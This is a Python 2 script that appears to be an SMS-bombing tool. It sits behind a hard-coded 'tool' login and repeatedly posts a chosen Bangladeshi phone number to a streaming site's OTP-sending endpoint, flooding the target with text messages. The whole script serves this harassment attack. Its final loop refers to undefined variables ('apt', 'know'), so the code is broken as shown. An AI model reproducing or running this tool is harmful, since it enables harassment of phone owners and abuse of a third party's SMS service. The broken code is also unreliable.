import  requests
import time
import os



# Regular Colors
black ="\033[0;30m"        # black 
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White


print(green+"""________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$""")
    

 
 
 
 


print (red+"ENTER YOUR USERNAME & PASSWORD ")	


CorrectUsername = "xDmmAsTeR"
CorrectPassword = "HAKERBOY"

loop = 'true'
while (loop == 'true'):
    username = raw_input(yellow+"Tool Username: ")
    if (username == CorrectUsername):
    	password = raw_input(blue+"Tool Password: ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:MDALAMIN
	    time.sleep(3)
            loop = 'false'
            
        
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.facebook.com/Mdalmin12345')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.facebook.com/Mdalmin12345')


os.system("clear")


    


print(red+"""                 
     /\   | |xDm mAsTeR  /\   |\     /| | | | |  | |
    /  \  | |       /  \  | \   / | | | |  \ | |
   / /\ \ | |      / /\ \ | |\/ | | | | | | \  |
  / ____ \| |____ / /__\_\| |   | | | | | |\ \ |
 /_/    \_\______/_/    \_\_|   |_| | | | | \ \|""")
 
 





number=str(input(green+" Enter The Number : "))

amount=int(input(blue+" Enter The Amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"




for i in range(amount):
    requests.post(apt,data=know)
    print(str(i+1)+red+" SMS Sent")

